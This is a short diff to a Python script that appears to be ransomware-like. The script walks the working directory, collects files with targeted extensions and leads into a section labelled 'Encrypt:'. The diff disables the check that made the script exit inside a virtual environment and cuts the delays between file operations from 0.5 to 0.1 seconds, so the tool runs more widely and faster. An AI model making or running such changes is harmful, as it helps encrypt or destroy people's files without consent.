@@ -28,8 +28,9 @@ def get_prefix():
 def runs_on_venv():
     return get_prefix() != sys.prefix
 
-if runs_on_venv():
-    sys.exit()
+if False:
+    if runs_on_venv():
+        sys.exit()
 # ========================================================================= #
 # Try to initialize on home:
 if False: # Disabled.
@@ -92,7 +93,7 @@ for dirpath, dirs, files in os.walk(os.getcwd()):
         f_extension = path.split('.')[-1]
         if f_extension in tool.targets:
             tool.files_found.append(path)
-        sleep(0.5)
+        sleep(0.1)
 
 # ========================================================================= #
 # Save Progress:
@@ -137,7 +138,7 @@ if False: # Disabled.
             tmp_data.close()
         except Exception as error:
             print(error)
-        sleep(0.5)
+        sleep(0.1)
 
 # ========================================================================= #
 # Encrypt:
